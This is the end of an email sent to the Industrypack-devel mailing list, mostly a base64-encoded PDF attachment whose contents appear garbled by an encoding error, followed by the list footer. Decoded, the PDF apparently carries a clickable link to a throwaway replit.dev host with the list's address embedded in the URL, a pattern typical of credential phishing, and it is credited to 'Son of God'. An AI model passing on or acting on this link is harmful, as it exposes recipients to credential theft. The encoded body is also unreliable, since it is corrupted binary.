rMaSYsKlT1c7QcOIw4kgxbjigKJIw6QNCmbCqcKkXUdvLcOqWsOmw5Ynw6dHIjLLnMOIM+KC
rMKgw7PCtOKAmsOkwrfCrcKheMOOeD/LhjXCr2PigKbDpsWhSzXigJPDucKuXsOeCcWhQcuG
wqPDmsKw4oCew7PDt+KAusOOQcObwp3DqcOVVTY4wrHLnC/CqyTDucKvcybDr8O+QTbDtsOT
w78gQsKqwql9SzsrfcOLw6YqPOKAoXZUY8KvVsOAJMOLwoHDvEpAw4/Di8Ktwo88w5XDhDHD
h3HDpitGw5HDomt4Q8KNwq7CvcuGwrDDjG3DmGFPw5LigKDigJ3DmsOMw6vDuMOuLMWSbMKN
M+KCrMORwrLFuMKdVXvDvsOxwrdxw5jFvU4qw5rDveKEosOdN8OGf3bigLrihKJL4oKsJSHC
skZJflzCgcWS4oCZQMOAw6bihKJnJDzCrzo/dMOqxaA6IyDigJzDm8Odw58kw58gw5N5dmZ3
wrbigJx6wqReUsOPw6Q54oCcP3g3w507OsO8asOu4oCYwo8vQcOPw70/w7nCs8OiIWnCp+KE
oiLDhSTigLklw4HDnGjDjzhWY8OUZMK2O0trfsOWw78gYzdrxpI4w6cnZ8O4w6fDq0DDmcOG
w6LDosOaVsKNwrzCpsucKGI4JOKAmMW4bMKPw4xTwqLigJl54oCmw6zCr3LigLrDmj3DkuKE
ouKAui8uXXjDsls4P0Bpw7FOw5NYW8OYw4TigJk1w4JcwrPDhMKowrvCt+KAlA0KMcOrwpBR
ccWSw6dxw6nFvV3Cp0MzQ3DCrcOU4oCYw4/igLBeYjfigKBC4oCgxaDigLrDgcOBODdIwqXD
lGDFvXnCvMuGWETCry7DksObwqrDpcKwOsOgc8Wgw64lw5HDocOTZMO7JeKAmEvDm8Obwq/D
ncOZwrRyVsKkZMW+PljCsWDCtjbGklV0w6sNCj9IwoHDgU1LVOKAuiDDmw0Ka2PCu8KzwrDC
j0HCuMO6ZMKv4oCwLXVvJcOswq3CrGfCvMWhw6tzdCPDnsOSw6HCvsOsa8OUIsKwbHPDssO0
UsK7wrNv4oC6RHZTwqfDrFLCq1F6LsO/IMOww5bihKLCrTTDmXRdPlfigLDDo8Ozw7rDqMOK
DQp1OMOHw4zigqwvOTLCqDtP4oCU4oCUw75Fw4vFk3/CpcOcf8Oow5ZtXeKAmXtmw5HDrcOg
UzDCuMW9V2ZSRiDDpyDDvMKqMcaSw5zDp8K1WlZWOcKnOU5OUsOd4oCYw4N0wqnigJQsbyrC
q8OvSMOM4oCeRsOKxb3CuXpzw4VKw7dcWMOcwrzDj8K6RsWhLnpgcCDigqwgICBV4oCYSsuG
YMO74oCgw4HDiSc9enbDrnpj4oCTQWpLZ8K8w5UuY8uGwq/LnF3FoMKpw4jDncOzc8OPQcKB
4oCZSSAgNMOGdGXCuGkxwrHDhlPCoSDCqMOONsKpw6dxw6tLw6nLnC7DoktWfcOtc2zCvXln
w5/CrXDDklttw7LDrHHDoHDDpcKQwqtgw6/Dm8Ocw6TDo8KpDQp+UEDDusWTwrEuwrPCqMOI
w5DCpMOZwrhw4oCcxZInPMOtWcOyw4jCsmNsSTPDt3PDj8OmTVnLhsOaXDXDjMK34oCZw4nF
ksOB4oCdIsOnOW/LnMO7wpAJw4DDisaSw4/DjDBSwqDFoCjCoA0KwqnDnFtCIcKzwrjDmWXi
gKJw4oCYDQrDh8OkL8K0f+KAlMKP4oC6PEVvaMOCw5/Di3NtI0jigJ5GWcucc8K8wqLigJRG
w5w/w71rxZPCtcK9xb0NCj7DusORw6zDoeKAosKuVTZMw4vDs8OCVcKz4oCiPuKAnmTDtMO0
w4HDqnTCrTrDpg0KWcOq4oCwDQotwrTCgeKAmUYyIAnDnsO4Yk7FvjByQMO7y5wkwrFR4oCm
eDnDgcKkdmBqw4bigKJ1KcOo4oC54oSiwqM1R8O7WsOXw7vDg8O+w74nw78gScO9wq9rw73D
ocO/IH/DvyDFoMKvK8OYVMOsfTfDlyh/Oi/DpsWgwqHDvcKva8O9w6HDvyB/w78gxaDCo8O7
XsOXw7vDg8O+w74nw78gR8KwwqnDmD7CuUPDucOReeKAnTLDrWA9a+KAlMK6wr3CusOTw6bC
jW3FoTjDkcKiVyAgcnrigJNSSMOb4oKsOcOJw5t7w7XigJnDjnnDoMOaVsOdI3nLhkrFkuKC
rMOQcnJIMcOIw44qxb3CuT7igLrDveKAk2FrUMOXw4ZEaC4iJMOGy4bDisOHwpBCKcOBYMOE
bTd+xZPCoX5jw4XDjTHDqsOyw4bDtjnDu+KAuuKAsG7Cp3nDpm3DkjdT4oKswrAgcCAgOMKi
wqLFoMOtPHDCosWgKCDCosWgKMK8wrTCt8OSwqzDtMKPNsOaw74vw63CqcKkw7cwS8Olw4PC
scKyw4FBw7lWPsO8wq3CtcKywqfCpsOLw43DkuKApsW4WsKydcK64oCdbcO/IMKzw6Fqw7zC
usOGwqE2wo3igJglw4bDq8OJW21uecOOM8O8R8K/esOOVMOUwrc7KGMnQjzCsUvDrjo2wrDD
m8OSw78gTG/Dt2/DocO+wqwpwqvigJPDrcOmR39mxZI7w4d9f0bDjXHDtFR7w7c6P8K1az3D
kjs4IsK9wr3igJlLw4jCrX/CtMKdwq8zQMK3IMKQy4Y8w6PCpVfDuzXFkzdvNMuGXcOZ4oC5
MsK54oCZM8OPwqBWIH0gwq5Swq/DqcK6w5bCp8Klw7bDmWJM4oCTw7LDs8ucw4kj4oCdOVJx
w6o7Sn7DicKtwqRPw5dpw4vDo8Kkwr5aw53Cr+KAoG8tWEXCpsOcw6nDtyrCrCMww45kRmI+
XcO7w7JAw5PDlMOWNsKvwqdeacOxw7nCgeKAmX09w7MywqvigLBCw6/DmeKAmUbDiT/DgsK5
w7nCscOBNcK2wrlzDQrFoXvCpCDDo8OOTDZJw45LwqlPw5TigJjDuldDwqRcw5rDjsK3MltM
w7DDi27igKHDjsO5aCbCj8K5w4Bdw6E5wqTFksWTwpApwq54w7nigJgvwqrDlV7DrcOiw77D
tHFUV13DolvFveKAucOpw4TDkcOdJcKywqHDhMKs4oChYsKs4oSiY8Ol4oCeVWxk4oSiQFBX
4oCYwq1OwqzDrFFFDQoowqLigqw/w7/DmQ0KZW5kc3RyZWFtDQplbmRvYmoNCjcgMCBvYmoN
Cjw8L1R5cGUvWE9iamVjdC9TdWJ0eXBlL0ltYWdlL1dpZHRoIDIxNy9IZWlnaHQgNjQvQ29s
b3JTcGFjZS9EZXZpY2VHcmF5L01hdHRlWyAwIDAgMF0gL0JpdHNQZXJDb21wb25lbnQgOC9J
bnRlcnBvbGF0ZSBmYWxzZS9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDg5Nz4+DQpzdHJl
YW0NCnjFk8ON4oSiwo3igJnDmyDigJ7DtcO+L03Cp+KAsMO9IwnDsOKApuKEojYuZ3bDt8OY
KSBpwq3CtcO/f8K8w5bDr8KBK23DqMW+NlhQfeKCrD7FvuKAlMOAUOKAmcOTesKyw6PCrcKr
w55aw6HCumfDnsOFL+KAosOuw4DDlMK1fsOTw4I7asKsbFcnw6U/w5F2w5JSwrE9J8OfTcOi
w63LnMKnw6p6SsO9w7FYxbhhR8K9w7tGeOKAusKswqnCq0LCtz3DocO9VcK4VjZqxb7CrVPD
nsW9w4XigJMkw63DsMWSJMOZLsOSTHHDrMOBID3DscKleMOmwqhhZ8OIw7rCsyzCtsOib8KB
PcO2J8OAw5rGksO1YMOwwqkzw67CqeKAnMO1N8KPTcKwPTog4oCUY1XDvnLDhsOwVsOPf8Ky
NsK2DQpFMcOawqpUQMOAZMKubcKwMTrDj+KAncOCa8Os4oCc4oKswrl2w6p2azfCgQ0KVlfD
lcOEwrMow4/CoVFwZcOGw4bigLrCqsKzw4pNKsK8xbgmw5DCtOKAlMOAw6Yzwo3FvsOAxb4p
w6TDmVhay4ZeNsOge8OFTDBqw5DDqkIyw4E0OlHCqUDDrsKBNsOAxaHDsiZQ4oC6w6PDnDvD
gMucMcOGOMW+QydXDQpMwrLDgHzCusOCw49RwrrCocKyZMWhw6jDkWdxCWbDg1NoOC/DoVFk
OcOHw6xCOsWSw6vDumBKeWB4wpA2wrzigJjDqSrDhcuGwqZy4oCcw4vDo8Kyw6E8wrB5DQp0
w6jDjcOSVlNWOsOv4oC54oKsaVxrwrA5OUpAw7JpacOycQ0KWsOMxb3DpcKz4oSiwrcpYHjF
kg0KaMOIw6I+d8OGw5TCviDLnMOYcQ0KPHwgTDtu4oCcYHrigLBsMDDigKA4YMO4w7figLBc
w6PCoMOywqLDi0NWy4bCsMOowqbFuHXCv0grJCsrISzCgXvigKDCs8Kmw71bw4PCqWR1xpI1
fsOCw7ltw47ihKJrMMOJIsKyCcKmw5TDl8O4wqrCqQ0KM8Orc8K+w7bDgXDDsUHDo8KoxpJl
w75D4oCay4bigLnihKJfw7vCv2NIwrc9RXbDgFAgLMObIHvigJzCrcOBw7rDrXfDgDrihKLD
uForMko1w4fDtcK1w6jigqzCscOawp1jDQpEy4bLhlpgxpLigJ7FvcK0xpJY4oCaw6XCucO6
w6/Dgj3DomJgw4g/wrRgI8OUDQrFksKdfcKkR8O0w4HCrOKAun7FkmdVdGTDhsOxbuKAmMO1
VcOmYDDFvcOubsW9euKCrMO+xpLFk8KdajR9xZPDqFcybOKCrD3igJNfwqzihKJcDQpd4oCU
w6pnw4nDhibCsnIyMg0Kwq3DqjfDisW9Mmxx4oCiw6J8wqvDgcK/O0zFoC1uLjExwrwsVkUv
b8O0KjnCtsKywrrCtcK1esOpZcKjMcOqd8K5PmbDtcKNw6XDh8OBKkbCr+KAmsK1w6x7w5/C
psOfwqtkO3Av4oKsbWDDo8O8KcOawr02w7zDssKBclt+LsOEYy1Sw7JeOcOQw4LDhlXCsMKz
w492bkBC4oCTKEbCuMK2xbjDq3PCjXDDpcWS4oCcw7NVfcOCKTdUw5LDnMK4f8OLWMKmxpLD
sVLCnTRu4oCwwrPDs8O1w5nDuibDpztnWHzigJ58w5t/wqc9KyXDpMO84oCiw7jDoSoNCmVu
ZHN0cmVhbQ0KZW5kb2JqDQo4IDAgb2JqDQo8PC9UeXBlL0ZvbnQvU3VidHlwZS9UcnVlVHlw
ZS9OYW1lL0YxL0Jhc2VGb250L1RpbWVzTmV3Um9tYW5QU01UL0VuY29kaW5nL1dpbkFuc2lF
bmNvZGluZy9Gb250RGVzY3JpcHRvciA5IDAgUi9GaXJzdENoYXIgMzIvTGFzdENoYXIgMzIv
V2lkdGhzIDE2IDAgUj4+DQplbmRvYmoNCjkgMCBvYmoNCjw8L1R5cGUvRm9udERlc2NyaXB0
b3IvRm9udE5hbWUvVGltZXNOZXdSb21hblBTTVQvRmxhZ3MgMzIvSXRhbGljQW5nbGUgMC9B
c2NlbnQgODkxL0Rlc2NlbnQgLTIxNi9DYXBIZWlnaHQgNjkzL0F2Z1dpZHRoIDQwMS9NYXhX
aWR0aCAyNjE0L0ZvbnRXZWlnaHQgNDAwL1hIZWlnaHQgMjUwL0xlYWRpbmcgNDIvU3RlbVYg
NDAvRm9udEJCb3hbIC01NjggLTIxNiAyMDQ2IDY5M10gPj4NCmVuZG9iag0KMTAgMCBvYmoN
Cjw8L1R5cGUvRXh0R1N0YXRlL0JNL05vcm1hbC9DQSAxPj4NCmVuZG9iag0KMTEgMCBvYmoN
Cjw8L1R5cGUvRm9udC9TdWJ0eXBlL1RydWVUeXBlL05hbWUvRjIvQmFzZUZvbnQvQXJpYWxN
VC9FbmNvZGluZy9XaW5BbnNpRW5jb2RpbmcvRm9udERlc2NyaXB0b3IgMTIgMCBSL0ZpcnN0
Q2hhciAzMi9MYXN0Q2hhciAxMjEvV2lkdGhzIDE3IDAgUj4+DQplbmRvYmoNCjEyIDAgb2Jq
DQo8PC9UeXBlL0ZvbnREZXNjcmlwdG9yL0ZvbnROYW1lL0FyaWFsTVQvRmxhZ3MgMzIvSXRh
bGljQW5nbGUgMC9Bc2NlbnQgOTA1L0Rlc2NlbnQgLTIxMC9DYXBIZWlnaHQgNzI4L0F2Z1dp
ZHRoIDQ0MS9NYXhXaWR0aCAyNjY1L0ZvbnRXZWlnaHQgNDAwL1hIZWlnaHQgMjUwL0xlYWRp
bmcgMzMvU3RlbVYgNDQvRm9udEJCb3hbIC02NjUgLTIxMCAyMDAwIDcyOF0gPj4NCmVuZG9i
ag0KMTMgMCBvYmoNCjw8L1N1YnR5cGUvTGluay9SZWN0WyAxNS43NSA2OTcuMjkgMTM1LjE5
IDcyMC45Nl0gL0JTPDwvVyAwPj4vRiA0L0E8PC9UeXBlL0FjdGlvbi9TL1VSSS9VUkkoaHR0
cHM6Ly9hZmNjM2E0OS0wNTUzLTQ4NjUtYTc5ZC0xZWU1ZGZhMTQ2NWYtMDAtMWpqbWJ6bWdz
dm02NC5waWNhcmQucmVwbGl0LmRldi8jaW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJj
ZWZvcmdlLm5ldCkgPj4+Pg0KZW5kb2JqDQoxNCAwIG9iag0KPDwvU3VidHlwZS9MaW5rL1Jl
Y3RbIC0yLjI1IDEuNTY4MSAxMC4zMzUgMi4xNDNdIC9CUzw8L1cgMD4+L0YgNC9BPDwvVHlw
ZS9BY3Rpb24vUy9VUkkvVVJJKGh0dHA6Ly93d3cudGNwZGYub3JnLykgPj4+Pg0KZW5kb2Jq
DQoxNSAwIG9iag0KPDwvQXV0aG9yKFNvbiBvZiBHb2QpIC9DcmVhdG9yKMO+w78gTSBpIGMg
ciBvIHMgbyBmIHQgwq4gICBXIG8gciBkICAgZiBvIHIgICBNIGkgYyByIG8gcyBvIGYgdCAg
IDMgNiA1KSAvQ3JlYXRpb25EYXRlKEQ6MjAyNDAyMDcxNzEwMjkrMDEnMDAnKSAvTW9kRGF0
ZShEOjIwMjQwMjA3MTcxMDI5KzAxJzAwJykgL1Byb2R1Y2VyKMO+w78gTSBpIGMgciBvIHMg
byBmIHQgwq4gICBXIG8gciBkICAgZiBvIHIgICBNIGkgYyByIG8gcyBvIGYgdCAgIDMgNiA1
KSA+Pg0KZW5kb2JqDQoxNiAwIG9iag0KWyAyNTBdIA0KZW5kb2JqDQoxNyAwIG9iag0KWyAy
NzggMjc4IDAgMCAwIDAgMCAwIDMzMyAzMzMgMCAwIDI3OCAzMzMgMjc4IDAgMCAwIDAgMCAw
IDAgMCAwIDAgMCAwIDAgMCAwIDAgMCAwIDY2NyAwIDcyMiA3MjIgMCA2MTEgMCAwIDAgMCAw
IDAgMCAwIDc3OCA2NjcgMCAwIDAgNjExIDAgNjY3IDAgMCAwIDAgMCAwIDAgMCAwIDAgNTU2
IDU1NiA1MDAgNTU2IDU1NiAyNzggNTU2IDU1NiAyMjIgMCA1MDAgMjIyIDgzMyA1NTYgNTU2
IDU1NiAwIDMzMyA1MDAgMjc4IDU1NiA1MDAgNzIyIDAgNTAwXSANCmVuZG9iag0KMTggMCBv
YmoNCjw8L1R5cGUvTWV0YWRhdGEvU3VidHlwZS9YTUwvTGVuZ3RoIDMwODY+Pg0Kc3RyZWFt
DQo8P3hwYWNrZXQgYmVnaW49IsOvwrvCvyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5
ZCI/Pjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IjMuMS03
MDEiPg0KPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIy
LXJkZi1zeW50YXgtbnMjIj4NCjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiICB4bWxu
czpwZGY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGRmLzEuMy8iPg0KPHBkZjpQcm9kdWNlcj5N
aWNyb3NvZnTDgsKuIFdvcmQgZm9yIE1pY3Jvc29mdCAzNjU8L3BkZjpQcm9kdWNlcj48L3Jk
ZjpEZXNjcmlwdGlvbj4NCjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiICB4bWxuczpk
Yz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iPg0KPGRjOmNyZWF0b3I+PHJk
ZjpTZXE+PHJkZjpsaT5Tb24gb2YgR29kPC9yZGY6bGk+PC9yZGY6U2VxPjwvZGM6Y3JlYXRv
cj48L3JkZjpEZXNjcmlwdGlvbj4NCjxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiICB4
bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPg0KPHhtcDpDcmVhdG9y
VG9vbD5NaWNyb3NvZnTDgsKuIFdvcmQgZm9yIE1pY3Jvc29mdCAzNjU8L3htcDpDcmVhdG9y
VG9vbD48eG1wOkNyZWF0ZURhdGU+MjAyNC0wMi0wN1QxNzoxMDoyOSswMTowMDwveG1wOkNy
ZWF0ZURhdGU+PHhtcDpNb2RpZnlEYXRlPjIwMjQtMDItMDdUMTc6MTA6MjkrMDE6MDA8L3ht
cDpNb2RpZnlEYXRlPjwvcmRmOkRlc2NyaXB0aW9uPg0KPHJkZjpEZXNjcmlwdGlvbiByZGY6
YWJvdXQ9IiIgIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0v
Ij4NCjx4bXBNTTpEb2N1bWVudElEPnV1aWQ6OEYzMTNEOTEtRUYyQS00NDdGLTlFOEQtN0RB
Qjc4NUMzQkZGPC94bXBNTTpEb2N1bWVudElEPjx4bXBNTTpJbnN0YW5jZUlEPnV1aWQ6OEYz
MTNEOTEtRUYyQS00NDdGLTlFOEQtN0RBQjc4NUMzQkZGPC94bXBNTTpJbnN0YW5jZUlEPjwv
cmRmOkRlc2NyaXB0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIA0KPC9yZGY6UkRGPjwveDp4bXBtZXRhPjw/eHBhY2tldCBlbmQ9InciPz4NCmVuZHN0
cmVhbQ0KZW5kb2JqDQoxOSAwIG9iag0KPDwvRGlzcGxheURvY1RpdGxlIHRydWU+Pg0KZW5k
b2JqDQoyMCAwIG9iag0KPDwvVHlwZS9YUmVmL1NpemUgMjAvV1sgMSA0IDJdIC9Sb290IDEg
MCBSL0luZm8gMTUgMCBSL0lEWzw5MTNEMzE4RjJBRUY3RjQ0OUU4RDdEQUI3ODVDM0JGRj48
OTEzRDMxOEYyQUVGN0Y0NDlFOEQ3REFCNzg1QzNCRkY+XSAvRmlsdGVyL0ZsYXRlRGVjb2Rl
L0xlbmd0aCA4MT4+DQpzdHJlYW0NCnjFk2NgIOKAmsO/w7/CgcKkIMuGKsKBUGvDgMOjczDD
hcK6Qj1TdWBKw6bLnOKAmcONU3LCqkzDieKAminDtUwp4oKsKcKlNUwpb1PCoiDDun4NCsKB
DQplbmRzdHJlYW0NCmVuZG9iag0KeHJlZg0KMCAyMQ0KMDAwMDAwMDAwMCA2NTUzNSBmDQow
MDAwMDAwMDE3IDAwMDAwIG4NCjAwMDAwMDAxMTYgMDAwMDAgbg0KMDAwMDAwMDE3MiAwMDAw
MCBuDQowMDAwMDAwNDg3IDAwMDAwIG4NCjAwMDAwMDE0NTMgMDAwMDAgbg0KMDAwMDAwMTUw
NiAwMDAwMCBuDQowMDAwMDA2MjcwIDAwMDAwIG4NCjAwMDAwMDczNjIgMDAwMDAgbg0KMDAw
MDAwNzUzMiAwMDAwMCBuDQowMDAwMDA3NzY4IDAwMDAwIG4NCjAwMDAwMDc4MjIgMDAwMDAg
bg0KMDAwMDAwNzk4NSAwMDAwMCBuDQowMDAwMDA4MjEyIDAwMDAwIG4NCjAwMDAwMDg0MjIg
MDAwMDAgbg0KMDAwMDAwODU2MCAwMDAwMCBuDQowMDAwMDA4ODM2IDAwMDAwIG4NCjAwMDAw
MDg4NjMgMDAwMDAgbg0KMDAwMDAwOTE0MCAwMDAwMCBuDQowMDAwMDEyMzA5IDAwMDAwIG4N
CjAwMDAwMTIzNTQgMDAwMDAgbg0KdHJhaWxlcg0KPDwvU2l6ZSAyMS9Sb290IDEgMCBSL0lu
Zm8gMTUgMCBSL0lEWzw5MTNEMzE4RjJBRUY3RjQ0OUU4RDdEQUI3ODVDM0JGRj48OTEzRDMx
OEYyQUVGN0Y0NDlFOEQ3REFCNzg1QzNCRkY+XSA+Pg0Kc3RhcnR4cmVmDQoxMjYzNQ0KJSVF
T0YNCnhyZWYNCjAgMA0KdHJhaWxlcg0KPDwvU2l6ZSAyMS9Sb290IDEgMCBSL0luZm8gMTUg
MCBSL0lEWzw5MTNEMzE4RjJBRUY3RjQ0OUU4RDdEQUI3ODVDM0JGRj48OTEzRDMxOEYyQUVG
N0Y0NDlFOEQ3REFCNzg1QzNCRkY+XSAvUHJldiAxMjYzNS9YUmVmU3RtIDEyMzU0Pj4NCnN0
YXJ0eHJlZg0KMTMyMTINCiUlRU9G

------=_NextPart_000_0012_4E2C17E4.80CE1508
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_4E2C17E4.80CE1508
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_4E2C17E4.80CE1508--

